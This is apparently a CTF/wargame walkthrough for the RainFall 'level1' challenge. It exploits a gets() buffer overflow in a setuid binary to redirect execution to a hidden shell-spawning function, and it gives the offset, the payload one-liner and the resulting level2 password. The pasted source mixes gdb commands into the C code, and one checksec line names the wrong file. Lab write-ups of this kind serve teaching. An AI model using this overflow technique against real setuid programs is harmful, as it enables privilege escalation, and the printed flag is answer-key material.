# 🔑 Level1 Walkthrough

## Step 1: Discovering the binary
When you log in as `level1`, you see the executable:

```bash
level1@RainFall:~$ ls -l
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

- Again, the **setuid bit** is set, but this time it runs with **level2’s privileges**.  
- That means if we can exploit it, we’ll escalate to `level2`.
- Doing file level1 we can see:
    setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
    the dynamically linked mean the function like get and printf are not provided at compile but at runtime in which the PLT refrence thier address so our program can use them Not stripped means the binary still contains symbol information (function names, variable names, etc.)
- doing checksec --file level0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   level0
The we use in this one is No PIE: The program loads at a fixed address in memory meaning it does not change the address at all.

---

## Step 2: Running the program
The binary just waits for input:

```bash
level1@RainFall:~$ ./level1
hello
level1@RainFall:~$ ./level1 test
423
```

It doesn’t do anything useful with our input — suspicious.

---

## Step 3: Looking at the source
The provided `source.c`:

```c
void run() {
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    disas run
    // with this we notice that system takes a varbieal with address 0x8048584
    // (gdb) x/s 0x8048584
    //we get this /bin/sh
    system("/bin/sh");
}

int main() {
    /*******************************************
    how did we the buffer is 64?
    first we notice that the variables size is 80 => sub    $0x50,%esp
    and then lea    0x10(%esp),%eax which mean the address of the buffer start at 16
    hence 80 - 16
    ********************************************/
    char buff[64];
    gets(buff);
    return 0;
}
```

- `main()` uses **gets()**, which is unsafe because it doesn’t check input length → **buffer overflow vulnerability**.
- **buffer overflow**: a buffer overflow occurs when the amount of data in the buffer exceeds its storage capacity.
   This extra data spills over into adjacent memory locations and corrupts or overwrites the data in those locations.  
- There’s a hidden function `run()` that prints a message and then spawns a shell.  
- The trick: **overwrite the return address of `main()` with the address of `run()`**.

---

## Step 4: Finding the offset
We need to know how many bytes to write before overwriting EIP (the return address).  
Using a pattern or just trial:

```bash
python -c 'print "A"*80' > /tmp/exploit
gdb ./level1
(gdb) r < /tmp/exploit
Program received signal SIGSEGV, Segmentation fault.
EIP = 0x61616161 
0x61616161 is just aaaa
EIP is the variable responisble for the next instrction to be done by stack it segv bc 0x61616161 is not a valid address
```

Offset found: **76 bytes**.

Why 76 bytes
first we know the buffer is 64
4 bytes saved EBP
8 bytes  alignment padding
---

## Step 5: Building the payload
We overwrite EIP with the address of `run()` (from gdb: `0x08048444`).
it includes a leading zero for full 32-bit formatting
Remember: little‑endian format → `\x44\x84\x04\x08`.
Stores least significant byte first hence it is in reverse
Memory expects little-endian
CPU reads bytes in that order

```bash
python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/payload
cat /tmp/payload - | ./level1
```

Output:

```
Good... Wait what?
Segmentation fault (core dumped)
```

We triggered `run()`, but the shell immediately exits because stdin is closed (EOF from the pipe).

---

## Step 6: Keeping the shell alive
To keep `/bin/sh` interactive, we need to keep stdin open.  
We can do this by appending `-` to `cat`, which keeps reading from the terminal:

```bash
cat /tmp/payload - | ./level1
```

Now we get:

```
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

We’ve successfully escalated to `level2`.

---

# ✅ Summary
- The binary uses `gets()` → buffer overflow.  
- Hidden function `run()` spawns a shell.  
- Offset to EIP: **76 bytes**.  
- Payload: `"A"*76 + address_of_run`.  
- Trick: use `cat payload - | ./level1` to keep stdin open.  
- Result: interactive shell as **level2**, allowing us to read the next password.
